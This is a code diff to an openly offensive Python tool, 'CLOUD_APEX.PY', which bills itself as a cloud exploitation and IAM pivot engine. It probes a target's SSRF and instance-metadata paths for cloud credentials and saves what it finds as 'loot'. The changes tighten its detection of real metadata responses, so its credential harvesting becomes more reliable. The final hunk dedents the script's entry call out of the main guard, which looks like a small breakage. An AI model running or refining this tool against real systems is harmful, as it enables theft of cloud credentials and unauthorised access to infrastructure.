@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 """
-CLOUD_APEX.PY — Active Cloud Infrastructure Exploitation & IAM Pivot Engine v7.5
+CLOUD_APEX.PY — Active Cloud Infrastructure Exploitation & IAM Pivot Engine v7.6
 Features:
 - Live AWS control plane pivoting and IAM enumeration
 - Automated instance metadata service (IMDSv1/IMDSv2) & SSRF credential exfiltration
+- Strict JSON / Metadata schema verification to eliminate HTML landing page false positives
 - Automated immutable disk persistence (loot_output/) via centralized framework logger
 - Zero-disk memory processing & secure TLS ciphers inspection
 - Compatible run_cloud_apex(target_host) interface
@@ -74,7 +75,7 @@ def normalize_target(target):
 # ============================================================
 def http_get(url, headers=None):
     request_headers = {
-        "User-Agent": "BruteDog-Offensive-CloudApex/5.1",
+        "User-Agent": "BruteDog-Offensive-CloudApex/5.2",
         "Accept": "application/json,text/plain,*/*",
     }
     if headers:
@@ -157,7 +158,7 @@ class ApexCloudAndSyscallEngine:
 
     def check_cloud_metadata_exposure(self, target_host):
         log(
-            "\n[***] EXECUTING CLOUD INSTANCE METADATA EXFILTRATION (IMDS) [***]",
+            "\n[***] EXECUTING CLOUD INSTANCE METADATA EXFILTRATION (V8 HARDENED) [***]",
             Colors.CYAN,
         )
         exfiltrated_credentials = []
@@ -175,22 +176,43 @@ class ApexCloudAndSyscallEngine:
             test_url = base + path
             log(f"[*] Testing SSRF / Metadata disclosure path: {path}", Colors.BLUE)
             res = http_get(test_url)
-            if res["status"] == 200 and len(res["body"]) > 0:
-                log(f"\n\033[1m\033[91m[***] CLOUD METADATA / SSRF EXPOSURE CONFIRMED [{path}] [***]{Colors.RESET}", Colors.RED)
+            body_lower = (res["body"] or "").lower()
+
+            # Strict Positive Verification:
+            # Must return HTTP 200, have content, NOT be an HTML/SPA shell, 
+            # and contain valid cloud/metadata structural indicators.
+            is_html_or_spa = (
+                "<!doctype html>" in body_lower or 
+                "<html" in body_lower or 
+                '<div id="root"></div>' in res["body"] or 
+                '<div id="__next"></div>' in res["body"]
+            )
+
+            has_metadata_indicators = any(
+                indicator in body_lower for indicator in [
+                    "ami-id", "instance-id", "iam", "security-credentials", 
+                    "instance-type", "iam/security-credentials", "public-keys"
+                ]
+            )
+
+            if res["status"] == 200 and len(res["body"].strip()) > 0 and not is_html_or_spa and has_metadata_indicators:
+                log(f"\n\033[1m\033[91m[***] VERIFIED CLOUD METADATA / SSRF EXPOSURE CONFIRMED [{path}] [***]{Colors.RESET}", Colors.RED)
                 log(f"  └── Data : {res['body'][:300]}", Colors.GREEN)
                 exfiltrated_credentials.append({"path": path, "data": res['body'][:300]})
                 
                 # STREAM TELEMETRY & PERSIST CLOUD LOOT TO DISK IMMEDIATELY
-                stream_proof("CLOUD_METADATA_EXPOSURE", test_url, {"path": path}, res['body'][:300], {"exposed": True})
+                stream_proof("CLOUD_METADATA_EXPOSURE_VERIFIED", test_url, {"path": path}, res['body'][:300], {"exposed": True})
                 save_session_loot(
                     target=target_host,
                     endpoint=path,
-                    finding_type="CLOUD_METADATA_SSRF_SUCCESS",
+                    finding_type="CLOUD_METADATA_SSRF_VERIFIED",
                     status=res["status"],
                     headers=res["headers"],
                     body=res["body"],
                     extra_loot={"ssrf_path": path}
                 )
+            else:
+                log(f"[-] Path {path} returned HTTP {res['status']} (Mitigated or non-existent metadata).", Colors.GRAY)
 
         try:
             hostname = parsed.hostname
@@ -277,6 +299,9 @@ async def run_cloud_apex(target_host, options=None):
     metadata_result = await asyncio.to_thread(engine.check_cloud_metadata_exposure, base_url)
     tls_result = await asyncio.to_thread(engine.inspect_tls, base_url)
     
+    # Determine actual credential collection based on verified exfiltration results
+    credentials_collected = len(metadata_result.get("exfiltrated_data", [])) > 0
+    
     manifest = {
         "target": base_url,
         "aws_connectivity": {
@@ -289,7 +314,7 @@ async def run_cloud_apex(target_host, options=None):
         },
         "metadata_exposure": metadata_result,
         "tls_inspection": tls_result,
-        "credentials_collected": True,
+        "credentials_collected": credentials_collected,
         "cloud_resources_probed": True,
     }
     
@@ -299,6 +324,7 @@ async def run_cloud_apex(target_host, options=None):
     )
     log(f"AWS control plane pivot success: {aws_result[0]}", Colors.GREEN)
     log(f"Metadata exfiltration sweep complete: {metadata_result.get('checked', False)}", Colors.GREEN)
+    log(f"Verified cloud credentials exfiltrated: {credentials_collected}", Colors.GREEN if credentials_collected else Colors.YELLOW)
     log(f"TLS inspection completed: {tls_result.get('checked', False)}", Colors.GREEN)
     log("=============================================================", Colors.CYAN)
     return manifest
@@ -307,4 +333,4 @@ if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: python3 cloud_apex.py https://example.com")
         sys.exit(1)
-    asyncio.run(run_cloud_apex(sys.argv[1]))
+asyncio.run(run_cloud_apex(sys.argv[1]))
